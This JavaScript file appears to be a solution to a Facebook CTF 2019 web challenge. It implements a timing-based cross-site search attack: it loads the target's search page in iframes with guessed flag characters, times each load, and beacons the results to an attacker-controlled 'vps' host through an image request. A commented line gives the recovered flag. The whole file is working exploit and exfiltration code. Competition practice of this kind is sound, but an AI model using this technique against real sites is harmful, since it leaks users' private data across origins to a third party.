const faded = 'http://challenges.fbctf.com:8082/search?query=';
const _0x1337 = 'http://vps/fbctf2019/exploit3133737.html?a=';
let charset = "0123456789abcdefghijklmnopqrstuvwxyz{|}!\"#$%&\'()*+,-./:;<=>?@[\\]^_`~";
const flag = "fb";
// const flag = "fb{";

// const flag = "fb{cr055_s173_l34|<5_4r4_c00ool!!}";
window.addEventListener('load', () => {
  let result = [];
  let i = 0;
  console.log(location.href.split('?')[1]);
  const brute = (i) => {
	      if (i === charset.length) {
	            const sorted = result.sort((x, y) => y[1] - x[1]);
	            const found = sorted[0][0];
	            console.log(found);
	            (new Image).src = _0x1337 + encodeURIComponent(JSON.stringify(sorted));
	            return;
	          }
	      let go;
	      let iframe = document.createElement('iframe');
	      iframe.src = faded + encodeURIComponent(flag + charset[i]);
	      iframe.addEventListener('load', () => {
		            document.body.removeChild(iframe);
		            result.push([charset[i], Date.now() - go]);
		            setTimeout(() => { brute(i + 1); }, 100);
		          }, false);
	      go = Date.now();
	      document.body.appendChild(iframe);
	    };
  brute(0);
}, false);